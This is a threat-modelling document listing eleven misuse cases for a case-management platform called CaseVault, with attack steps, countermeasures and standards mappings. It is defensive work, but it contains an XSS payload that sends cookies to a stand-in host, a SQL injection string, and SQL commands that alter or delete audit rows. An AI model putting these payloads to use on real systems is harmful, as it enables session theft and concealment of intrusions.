# Misuse Cases: CaseVault

Misuse cases model interactions from the perspective of an adversary or malicious insider attempting to subvert CaseVault's security boundaries. Each scenario pairs an attacker goal with system vulnerability paths, concrete preventative/detective countermeasures, and security standards mappings.

---

## 1. Summary of Misuse Cases

| ID | Misuse Case Title | Primary Adversary | Targeted Asset | Primary Countermeasure & SR |
|---|---|---|---|---|
| **MUC-01** | Cross-Tenant Data Access | Malicious Client / Competitor | Foreign Tenant Cases & Reports | Server-side `AccessPolicy` scoping + HTTP 404 masking (SR-01, SR-02) |
| **MUC-02** | Privilege Escalation via Compromised Low-Privilege Account | Compromised Client Account | Case Assignment & Approval Endpoints | Method security `@PreAuthorize` + DTO strict validation (SR-01, SR-03) |
| **MUC-03** | Insecure Direct Object Reference (ID Manipulation / BOLA) | Authenticated Attacker | Evidence Artifacts & Notes | Non-guessable UUIDs + DB tenant-bound joins (SR-01, SR-02) |
| **MUC-04** | Injection Attacks in Notes, Search & Reports | Malicious Insider / Analyst | Browser Context & Database Engine | Strict `th:text` escaping, CSP (`script-src 'self'`, no inline script), JPA parameters (SR-08, SR-09, SR-10) |
| **MUC-05** | Disguised Malicious Binary / Web Shell Upload | External Threat Actor | Application Server & Filesystem | Apache Tika magic-byte inspection, blocked SVG/binaries, non-root (SR-11, SR-18) |
| **MUC-06** | Credential & Secret Exposure | Host Intruder / Repository Snooper | Master Keys & Admin Credentials | Git-ignored `.local-data/`, Gitleaks CI, zero-secret policy (SR-16) |
| **MUC-07** | Supply Chain Exploitation via Vulnerable Dependencies | Supply Chain Attacker | Application Runtime & Process | Maven Enforcer convergence, Trivy CI scanner, SBOM (SR-17) |
| **MUC-08** | Retroactive Audit Trail Tampering | Rogue Database Operator | Audit Log Integrity | JDK HMAC-SHA256 chaining, exclusive append locking (SR-13, SR-14) |
| **MUC-09** | Information Gathering via Log, Exception & Backup Leakage | External Reconnaissance Attacker | System Architecture & Database Schema | Generic `@ControllerAdvice` error masking, UUID correlation ID (SR-15) |
| **MUC-10** | Automated Credential Stuffing & Resource Exhaustion | Automated Botnet | Authentication System & DB Capacity | Account lockout (5 attempts), timing equalization, search pagination (SR-04) |
| **MUC-11** | Malicious Insider (Self-Approval & Admin Surveillance) | Rogue Manager / Rogue Auditor-Admin | Report Integrity & Case Content | Four-Eyes enforcement, hard auditor-admin boundary returning 404 (SR-06, SR-07) |

---

## 2. Detailed Misuse Scenarios

### MUC-01: Cross-Tenant Data Access
- **Adversary Profile**: Authenticated user belonging to Client Organisation Alpha.
- **Adversary Motivation**: Spy on incident investigations, root-cause findings, and compromise indicators of competing Client Organisation Beta.
- **Attack Scenario**:
  1. Attacker observes API endpoints structured as `/cases/{uuid}`.
  2. Attacker acquires or discovers a valid UUID belonging to Organisation Beta.
  3. Attacker sends an authenticated `GET /cases/{beta-uuid}` request with Organisation Alpha session cookies.
  4. If tenant checks are missing or handled only at UI level, the controller returns Beta's case data.
- **System Impact**: Catastrophic confidentiality breach between competing enterprise clients; loss of consulting firm trust and regulatory penalties under GDPR.
- **Defensive Countermeasures**:
  - Service layer enforces `WHERE case.organisation_id = :sessionOrgId` on every lookup (SR-01).
  - Any lookup that fails tenant ownership check returns HTTP `404 Not Found` (never 403), masking existence (SR-02).
- **Standards Mapping**:
  - OWASP Top 10:2025: A01 (Broken Access Control) [VERIFY MANUALLY] / A01:2021
  - CWE: CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information)
  - ASVS 5.0: V4.1 Access Control Enforcement [VERIFY MANUALLY]

---

### MUC-02: Privilege Escalation via Compromised Low-Privilege Account
- **Adversary Profile**: External threat actor who phished a low-privilege `CLIENT` user credential.
- **Adversary Motivation**: Reassign cases to unauthorized analysts, change case status to `CLOSED` to disrupt incident response SLAs, or trigger unauthorized report releases.
- **Attack Scenario**:
  1. Attacker logs into CaseVault using valid `CLIENT` credentials.
  2. Attacker inspects client-side JavaScript or guesses administrative endpoints (e.g. `POST /cases/{id}/assign` or `POST /cases/{id}/status`).
  3. Attacker submits a forged request attempting to reassign the case or force a status transition to `CLOSED`.
- **System Impact**: Unauthorized case modification, disruption of forensic operations, unauthorized closure of critical incident investigations.
- **Defensive Countermeasures**:
  - Server-side Spring Security method security (`@PreAuthorize("hasRole('MANAGER')")`) guards assignment and transition methods (SR-01).
  - Request DTOs strictly whitelist permitted fields, ignoring unauthorized role or status attributes.
- **Standards Mapping**:
  - OWASP Top 10:2025: A01 (Broken Access Control) [VERIFY MANUALLY] / A01:2021
  - CWE: CWE-285 (Improper Authorization), CWE-269 (Improper Privilege Management)
  - ASVS 5.0: V4.1 Access Control [VERIFY MANUALLY]

---

### MUC-03: Insecure Direct Object Reference (ID Manipulation / BOLA)
- **Adversary Profile**: Authenticated client or analyst user.
- **Adversary Motivation**: Directly access forensic evidence artifacts or private notes by altering identifier parameters in download or query endpoints.
- **Attack Scenario**:
  1. Attacker intercepts an evidence download request: `GET /cases/1111/evidence/2222/download`.
  2. Attacker modifies the evidence UUID to `3333` (an artifact from another case or organisation).
  3. Attacker inspects whether the server validates the parent-child-tenant relationship or merely looks up the primary key in the evidence table.
- **System Impact**: Unauthorized exfiltration of sensitive digital evidence (memory dumps, customer databases, disk images).
- **Defensive Countermeasures**:
  - Repository lookup strictly enforces compound criteria: `findByEvidenceIdAndCaseIdAndTenantId(...)` (SR-01).
  - Non-matching or foreign object references throw `ResourceNotFoundException`, returning HTTP 404 (SR-02).
- **Standards Mapping**:
  - OWASP Top 10:2025: A01 (Broken Access Control - BOLA / IDOR) [VERIFY MANUALLY] / A01:2021
  - CWE: CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284
  - ASVS 5.0: V4.1, V4.2 [VERIFY MANUALLY]

---

### MUC-04: Injection Attacks in Notes, Search & Reports
- **Adversary Profile**: Malicious insider (rogue analyst) or compromised client account.
- **Adversary Motivation**: Execute stored XSS in review dashboards to steal manager sessions, or execute SQL injection to exfiltrate entire database tables.
- **Attack Scenario**:
  1. Attacker enters polyglot XSS payload into case notes: `<script src="https://evil.test/x.js"></script><img src=x onerror=this.src='http://evil.test/?c='+document.cookie>`
  2. Manager views case notes during pre-report review.
  3. Attacker also submits SQL meta-characters (`' OR 1=1 --`, `%`, `_`) into the case search bar.
- **System Impact**: Session hijacking of high-privilege accounts, DOM manipulation, unauthorized database exfiltration or denial-of-service.
- **Defensive Countermeasures**:
  - Contextual HTML entity encoding (`th:text`) enforced across all Thymeleaf templates; `th:utext` strictly forbidden (SR-08).
  - Strict Content Security Policy (two headers; `script-src 'self'`, `object-src 'none'`; no nonce, templates have no inline script) blocks untrusted script execution (SR-09).
  - Parameterised Spring Data JPA queries eliminate SQL injection; wildcards in search terms are escaped (SR-10).
- **Standards Mapping**:
  - OWASP Top 10:2025: A03 (Injection) [VERIFY MANUALLY] / A03:2021
  - CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-89 (SQL Injection)
  - ASVS 5.0: V5.2, V5.3 [VERIFY MANUALLY]

---

### MUC-05: Disguised Malicious Binary / Web Shell Upload
- **Adversary Profile**: External attacker possessing client upload privileges.
- **Adversary Motivation**: Upload an executable web shell (`cmd.jsp`, `shell.php`) or malicious payload disguised as a benign forensic file to achieve Remote Code Execution (RCE).
- **Attack Scenario**:
  1. Attacker crafts a PHP web shell or Linux ELF binary and renames it to `firewall_capture.pcap` or `server_log.txt`.
  2. Attacker uploads the file via `/cases/{id}/evidence`.
  3. Attacker attempts to trigger execution by requesting the file path directly or exploiting server-side parsing bugs.
- **System Impact**: Remote code execution, server host takeover, pivot to internal consultancy network.
- **Defensive Countermeasures**:
  - Apache Tika performs magic-byte deep content inspection; mismatches between file header and declared MIME type trigger immediate rejection (SR-11).
  - Executable extensions and SVG files are blocked outright (SR-11).
  - Uploaded files are stored outside the web root, encrypted immediately with Google Tink AES-256-GCM, and downloaded only as attachment streams with `nosniff` (SR-11, SR-12).
  - Synthetic test data only; antivirus scanning stub integrated (SR-19).
- **Standards Mapping**:
  - OWASP Top 10:2025: A04 (Insecure Design) [VERIFY MANUALLY] / A04:2021
  - CWE: CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-350
  - ASVS 5.0: V12.1 [VERIFY MANUALLY]

---

### MUC-06: Credential & Secret Exposure
- **Adversary Profile**: Unauthenticated external snooper or malicious insider browsing source repositories.
- **Adversary Motivation**: Discover hardcoded master keys, database passwords, or administrative credentials to obtain unrestricted persistent access.
- **Attack Scenario**:
  1. Attacker clones repository or inspects Git commit history for API tokens, private keys, or `.env` files.
  2. Attacker inspects application logs or error banners looking for embedded secrets.
- **System Impact**: Complete compromise of platform encryption keys, database credentials, and administrative accounts.
- **Defensive Countermeasures**:
  - Zero-secret repository policy: keys and admin passwords generated dynamically at first startup into `.local-data/` or `secrets/` (git-ignored) (SR-16).
  - Automated pre-commit filters and Gitleaks CI scanning reject commits containing secret patterns (SR-16).
  - Application logs explicitly exclude passwords, tokens, and encryption payloads (SR-15).
- **Standards Mapping**:
  - OWASP Top 10:2025: A07 (Identification and Authentication Failures) [VERIFY MANUALLY] / A07:2021
  - CWE: CWE-798 (Use of Hard-coded Credentials), CWE-259
  - ASVS 5.0: V14.1 [VERIFY MANUALLY]

---

### MUC-07: Supply Chain Exploitation via Vulnerable Dependencies
- **Adversary Profile**: External threat actor exploiting known public vulnerabilities (CVEs) in third-party libraries.
- **Adversary Motivation**: Gain code execution or bypass authentication via deserialization, parser flaws, or outdated dependencies (e.g., vulnerable Jackson, Tomcat, Spring libraries).
- **Attack Scenario**:
  1. Attacker identifies third-party libraries used by CaseVault from open-source manifests or runtime behavior.
  2. Attacker sends exploit payloads targeting known unpatched CVEs in unmanaged transitive dependencies.
- **System Impact**: Remote code execution, privilege escalation, or unauthenticated information disclosure.
- **Defensive Countermeasures**:
  - Maven Enforcer enforces `dependencyConvergence` and bans duplicate dependencies, eliminating classpath ambiguities (SR-17).
  - CI pipeline executes Trivy vulnerability scanner (`--severity CRITICAL,HIGH --exit-code 1`) blocking builds with unmitigated flaws (SR-17).
  - CycloneDX generates automated Software Bill of Materials (SBOM) for complete supply chain traceability (SR-17).
- **Standards Mapping**:
  - OWASP Top 10:2025: A06 (Vulnerable and Outdated Components) [VERIFY MANUALLY] / A06:2021
  - CWE: CWE-1395 (Dependency Convergence), CWE-1104
  - ASVS 5.0: V14.2 [VERIFY MANUALLY]

---

### MUC-08: Retroactive Audit Trail Tampering
- **Adversary Profile**: Rogue database administrator or compromised infrastructure process with direct SQL access.
- **Adversary Motivation**: Cover tracks of unauthorized case access, evidence exfiltration, or rogue user creation by modifying or deleting historical audit rows.
- **Attack Scenario**:
  1. Attacker executes `UPDATE audit_log SET actor_id = 'benign-analyst' WHERE id = 'malicious-event'`.
  2. Attacker deletes specific rows (`DELETE FROM audit_log WHERE event_type = 'UNAUTHORIZED_ACCESS'`).
- **System Impact**: Loss of evidentiary integrity, inability to conduct forensic post-mortems, invalidation of compliance audits.
- **Defensive Countermeasures**:
  - Audit log entries are sequentially chained using JDK HMAC-SHA256 binding sequence, previous hash, payload, actor, and millisecond-truncated timestamp (SR-13).
  - Modifying or removing any row breaks the cryptographic chain for all subsequent entries, immediately detected during verification (SR-13).
  - Transaction-level append locking guarantees strictly monotonic sequence progression under concurrent requests (SR-14).
- **Standards Mapping**:
  - OWASP Top 10:2025: A08 (Software and Data Integrity Failures) [VERIFY MANUALLY] / A08:2021
  - CWE: CWE-353 (Missing Support for Integrity Check), CWE-365
  - ASVS 5.0: V7.4 [VERIFY MANUALLY]

---

### MUC-09: Information Gathering via Log, Exception & Backup Leakage
- **Adversary Profile**: Unauthenticated attacker performing automated reconnaissance.
- **Adversary Motivation**: Force application errors to discover internal framework versions, database schema names, SQL dialects, or disk file paths.
- **Attack Scenario**:
  1. Attacker sends malformed HTTP payloads, invalid JSON, or oversized inputs to trigger unhandled exceptions.
  2. Attacker inspects HTTP 500 error responses or publicly accessible actuator endpoints for stack traces and environment dumps.
  3. Attacker searches backup snapshots for plaintext database dumps or unencrypted evidence files.
- **System Impact**: Leaked technical details significantly decrease the difficulty of crafting secondary targeted exploit payloads.
- **Defensive Countermeasures**:
  - Global `@ControllerAdvice` sanitizes all exceptions, returning generic user-safe error messages with opaque UUID correlation IDs (SR-15).
  - Actuator endpoints are restricted; server version banners are suppressed (SR-09, SR-15).
  - All evidence files are encrypted at rest with Google Tink AES-256-GCM, ensuring backups contain only ciphertext (SR-12).
- **Standards Mapping**:
  - OWASP Top 10:2025: A05 (Security Misconfiguration) [VERIFY MANUALLY] / A05:2021
  - CWE: CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-497
  - ASVS 5.0: V7.1 [VERIFY MANUALLY]

---

### MUC-10: Automated Credential Stuffing & Resource Exhaustion
- **Adversary Profile**: Automated botnet utilizing credential dumps from third-party breaches.
- **Adversary Motivation**: Take over valid user accounts via high-frequency brute-force login requests, or exhaust database connections using unbounded queries.
- **Attack Scenario**:
  1. Botnet submits thousands of login requests against `/login` using dictionary lists.
  2. Botnet measures response times to distinguish valid usernames (slow hash evaluation) from non-existent users (fast 404/401).
  3. Attacker sends repeated wildcard search requests (`%`) to exhaust database memory and CPU.
- **System Impact**: Unauthorized account takeover, system denial-of-service, database thread pool exhaustion.
- **Defensive Countermeasures**:
  - Account lockout after 5 consecutive failed attempts for 15 minutes (SR-04).
  - Authentication failure error messages are identical (*"Invalid username or password"*); timing equalization executes a dummy Argon2id calculation on invalid usernames (SR-04).
  - Search queries enforce maximum page limits and escape SQL wildcards (SR-10).
- **Standards Mapping**:
  - OWASP Top 10:2025: A07 (Identification and Authentication Failures) [VERIFY MANUALLY] / A07:2021
  - CWE: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-204
  - ASVS 5.0: V2.2, V11.1 [VERIFY MANUALLY]

---

### MUC-11: Malicious Insider (Self-Approval & Admin Surveillance)
- **Adversary Profile**: Rogue Manager or Rogue Auditor-Admin.
- **Adversary Motivation**:
  - Scenario A: A rogue manager authors a biased or fabricated forensic report and unilaterally approves it to conceal investigative failures.
  - Scenario B: A rogue auditor-admin abuses administrative privileges to read sensitive client evidence files or investigation notes.
- **Attack Scenario**:
  - Scenario A: Manager creates draft report `R-100` and immediately invokes `POST /reports/R-100/approve`.
  - Scenario B: Auditor-Admin navigates to `/cases/100` or `/cases/100/evidence/200/download`.
- **System Impact**: Fraudulent forensic deliverables released to clients without oversight; breach of attorney-client and consultancy confidentiality boundaries.
- **Defensive Countermeasures**:
  - Four-Eyes Principle: Report service verifies `report.getAuthorId() != currentUserId`; self-approval is rejected server-side (SR-06).
  - Strict Role Separation: `AUDITOR_ADMIN` role is blocked from `/cases/**` and `/evidence/**`, returning HTTP 404 (SR-07).
  - All approval and administrative actions emit HMAC-chained audit log events (SR-13).
- **Standards Mapping**:
  - OWASP Top 10:2025: A01 (Broken Access Control) [VERIFY MANUALLY] / A01:2021
  - CWE: CWE-284 (Improper Access Control), CWE-269
  - ASVS 5.0: V4.1, V8.1 [VERIFY MANUALLY]
